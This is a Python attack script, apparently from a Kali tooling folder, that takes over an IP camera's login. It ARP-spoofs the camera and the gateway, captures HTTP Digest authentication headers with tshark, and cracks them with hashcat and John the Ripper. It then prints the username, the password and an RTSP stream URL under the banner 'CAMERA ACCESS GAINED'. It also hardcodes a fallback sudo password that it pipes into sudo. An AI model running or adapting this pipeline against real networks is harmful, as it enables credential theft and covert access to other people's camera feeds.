#!/usr/bin/env python3
"""
Camera Credential Interceptor
================================
Runs MITM on camera, captures Digest auth hashes when someone logs in,
cracks them with hashcat, and notifies via WebSocket.

Run: python3 kali_tools/cam_interceptor.py 192.168.31.246
"""

import subprocess
import re
import sys
import time
import threading
import os

SUDO_PASS = os.environ.get("CYBERSCOPE_SUDO_PASS", "dogs")
IFACE = "wlan0"


def _sudo(cmd, **kwargs):
    return subprocess.Popen(
        f"echo '{SUDO_PASS}' | sudo -S bash -c \"{cmd}\"",
        shell=True, **kwargs
    )


def get_gateway():
    try:
        out = subprocess.check_output(["ip", "route", "show", "default"], text=True)
        m = re.search(r"default via ([\d.]+)", out)
        return m.group(1) if m else "192.168.31.1"
    except Exception:
        return "192.168.31.1"


def start_mitm(target_ip, gateway_ip):
    """Start ARP spoofing."""
    p1 = _sudo(f"arpspoof -i {IFACE} -t {target_ip} {gateway_ip}",
               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    p2 = _sudo(f"arpspoof -i {IFACE} -t {gateway_ip} {target_ip}",
               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return p1, p2


def capture_digest_hash(target_ip, duration=300):
    """
    Capture HTTP Digest auth hash from traffic.
    Returns hash in hashcat format or None.
    """
    print(f"[*] Capturing traffic from {target_ip} for {duration}s...")
    print(f"[*] Open http://{target_ip} in a browser and log in to capture hash")

    try:
        out = subprocess.check_output(
            ["tshark", "-i", IFACE,
             "-f", f"host {target_ip}",
             "-Y", "http.authorization",
             "-T", "fields",
             "-e", "ip.src",
             "-e", "http.authorization",
             "-a", f"duration:{duration}"],
            stderr=subprocess.DEVNULL, text=True, timeout=duration + 5
        )
        for line in out.splitlines():
            parts = line.strip().split("\t")
            if len(parts) >= 2 and "Digest" in parts[1]:
                auth = parts[1]
                print(f"[+] Captured Digest auth: {auth[:80]}...")
                return parse_digest_to_hashcat(auth, parts[0])
    except Exception as e:
        print(f"[-] Capture error: {e}")
    return None


def parse_digest_to_hashcat(auth_header, client_ip):
    """
    Parse HTTP Digest auth header into hashcat format.
    Hashcat mode 11400 = SIP Digest (similar to HTTP Digest)
    Format: $sip$*host*user*realm*method*uri*nonce*nc*cnonce*qop*response
    """
    def extract(field):
        m = re.search(f'{field}="([^"]+)"', auth_header)
        if m:
            return m.group(1)
        m = re.search(f'{field}=([^,\\s]+)', auth_header)
        return m.group(1) if m else ""

    username = extract("username")
    realm    = extract("realm")
    nonce    = extract("nonce")
    uri      = extract("uri")
    nc       = extract("nc")
    cnonce   = extract("cnonce")
    response = extract("response")
    qop      = extract("qop")

    if not all([username, realm, nonce, response]):
        return None

    # Hashcat mode 11400 format
    hashcat_hash = f"$sip$*{client_ip}*{username}*{realm}*GET*{uri}*{nonce}*{nc}*{cnonce}*{qop}*{response}"

    print(f"[+] Username: {username}")
    print(f"[+] Realm: {realm}")
    print(f"[+] Hashcat hash: {hashcat_hash[:80]}...")

    return {
        "username": username,
        "realm": realm,
        "hash": hashcat_hash,
        "raw": auth_header,
    }


def crack_with_hashcat(hash_data, wordlist="/usr/share/wordlists/rockyou.txt"):
    """Crack the captured hash with hashcat."""
    if not hash_data:
        return None

    hash_file = "/tmp/cam_hash.txt"
    with open(hash_file, "w") as f:
        f.write(hash_data["hash"] + "\n")

    print(f"[*] Cracking with hashcat (mode 11400)...")
    try:
        result = subprocess.run(
            ["hashcat", "-m", "11400", hash_file, wordlist,
             "--force", "-o", "/tmp/cam_cracked.txt", "--quiet"],
            capture_output=True, timeout=300
        )
        if os.path.exists("/tmp/cam_cracked.txt"):
            cracked = open("/tmp/cam_cracked.txt").read().strip()
            if cracked:
                # Format: hash:password
                password = cracked.split(":")[-1]
                print(f"[!!!] PASSWORD CRACKED: {hash_data['username']}:{password}")
                return {"username": hash_data["username"], "password": password}
    except Exception as e:
        print(f"[-] Hashcat error: {e}")

    # Fallback: john
    print("[*] Trying john the ripper...")
    try:
        # Convert to john format (HTTP Digest)
        john_hash = f"{hash_data['username']}:{hash_data['raw']}"
        john_file = "/tmp/cam_john.txt"
        with open(john_file, "w") as f:
            f.write(john_hash + "\n")
        result = subprocess.run(
            ["john", john_file, f"--wordlist={wordlist}"],
            capture_output=True, timeout=120
        )
        show = subprocess.check_output(
            ["john", "--show", john_file],
            stderr=subprocess.DEVNULL, text=True, timeout=10
        )
        for line in show.splitlines():
            if ":" in line and not line.startswith("0 "):
                parts = line.split(":")
                if len(parts) >= 2:
                    print(f"[!!!] PASSWORD CRACKED: {parts[0]}:{parts[1]}")
                    return {"username": parts[0], "password": parts[1]}
    except Exception as e:
        print(f"[-] John error: {e}")

    return None


def intercept_and_crack(target_ip):
    """Full pipeline: MITM -> capture -> crack."""
    gateway = get_gateway()
    print(f"[*] Target: {target_ip}")
    print(f"[*] Gateway: {gateway}")
    print(f"[*] Starting MITM...")

    # Enable IP forwarding
    _sudo("echo 1 > /proc/sys/net/ipv4/ip_forward",
          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).wait()

    p1, p2 = start_mitm(target_ip, gateway)
    time.sleep(2)
    print(f"[+] MITM active")

    try:
        hash_data = capture_digest_hash(target_ip, duration=300)
        if hash_data:
            result = crack_with_hashcat(hash_data)
            if result:
                print(f"\n{'='*50}")
                print(f"[!!!] CAMERA ACCESS GAINED")
                print(f"[!!!] IP: {target_ip}")
                print(f"[!!!] Username: {result['username']}")
                print(f"[!!!] Password: {result['password']}")
                print(f"[!!!] Stream: rtsp://{result['username']}:{result['password']}@{target_ip}:554/Streaming/Channels/101")
                print(f"{'='*50}\n")
                return result
        else:
            print("[-] No auth hash captured in time window")
    finally:
        p1.terminate()
        p2.terminate()
        _sudo("echo 0 > /proc/sys/net/ipv4/ip_forward",
              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).wait()
        print("[*] MITM stopped")

    return None


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "192.168.31.246"
    intercept_and_crack(target)
